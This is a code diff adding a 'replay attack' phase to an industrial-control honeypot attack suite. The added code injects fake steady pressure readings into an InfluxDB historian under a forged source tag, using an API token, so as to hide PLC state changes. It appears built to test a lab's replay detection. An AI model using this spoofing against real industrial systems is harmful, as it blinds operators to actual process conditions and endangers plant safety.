@@ -460,6 +460,50 @@ def phase7_privesc(targets: dict):
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+# Phase 8 — Replay Attack (Historian Freezing)
+# ─────────────────────────────────────────────────────────────────────────────
+def phase8_replay(targets: dict):
+    banner("PHASE 8: REPLAY ATTACK — Historian Spoofing/Freezing")
+    print("  Strategy: Inject spoofed 'normal' telemetry directly into InfluxDB")
+    print("  to hide PLC state changes from the historian.")
+    print("  This triggers the hmi_simulator replay detection (flat historian + moving PLC).")
+    
+    if not HAS_REQUESTS:
+        warn("requests not available — cannot execute this phase (pip install requests)")
+        return
+    
+    # Historian internal hostname via docker
+    INFLUX_API_URL  = 'http://ics_historian:8086/api/v2/write?org=my_refinery&bucket=sensor_logs&precision=ns'
+    INFLUX_TOKEN    = os.environ.get("INFLUX_TOKEN", "supersecrettoken")
+    
+    headers  = {
+        'Authorization': f'Token {INFLUX_TOKEN}',
+        'Content-Type':  'text/plain; charset=utf-8',
+    }
+    
+    spoof_value   = 120.0  
+    print("  Injecting static 120.0 PSI as 'historian_bridge' to mimic a frozen feed...")
+    success_count = 0
+    for i in range(15):
+        ts = time.time_ns()
+        payload = f"pipeline_metrics,location=pump_station_01,source=historian_bridge pressure={spoof_value} {ts}"
+        try:
+            r = requests.post(INFLUX_API_URL, headers=headers, data=payload, timeout=5)
+            if r.status_code == 204:
+                success_count += 1
+                result("Spoofed frame", f"{spoof_value} PSI (#{i+1})")
+            else:
+                warn(f"HTTP {r.status_code}: {r.text}")
+        except Exception as e:
+            warn(f"Request error: {e}")
+            break
+            
+        time.sleep(0.1)
+
+    result("Replay Attack", "Injection complete. If PLC state is fluctuating, Grafana will alert REPLAY_ATTACK.")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Main dispatch
 # ─────────────────────────────────────────────────────────────────────────────
 PHASES = {
@@ -470,12 +514,13 @@ PHASES = {
     5: ("Payload Delivery",    phase5_payload),
     6: ("Lateral Movement",    phase6_lateral_movement),
     7: ("Privilege Escalation", phase7_privesc),
+    8: ("Replay Attack",       phase8_replay),
 }
 
 def main():
     parser = argparse.ArgumentParser(description="ICS Honeypot Attack Suite")
     parser.add_argument("--phase",  type=int, default=0,
-                        help="Phase to run (1-7), 0=all (default: 0)")
+                        help="Phase to run (1-8), 0=all (default: 0)")
     parser.add_argument("--target", type=str, default=None,
                         help="Override Modbus/S7/DNP3 host (default: from env/docker service name)")
     args = parser.parse_args()
@@ -492,11 +537,11 @@ def main():
     print("=" * 60)
 
     if args.phase == 0:
-        print("  Running ALL phases (1-7) …")
-        for n in range(1, 8):
+        print("  Running ALL phases (1-8) …")
+        for n in range(1, 9):
             name, fn = PHASES[n]
             fn(targets)
-            if n < 7:
+            if n < 8:
                 sleep_with_label(2, f"transition → Phase {n+1}")
         print(SEPARATOR)
         print("  [DONE] Full kill chain complete.")
@@ -507,7 +552,7 @@ def main():
         print(SEPARATOR)
         print(f"  [DONE] Phase {args.phase}: {name} complete.")
     else:
-        print(f"[ERR] Unknown phase {args.phase}. Choose 0-7.")
+        print(f"[ERR] Unknown phase {args.phase}. Choose 0-8.")
         sys.exit(1)
 
 
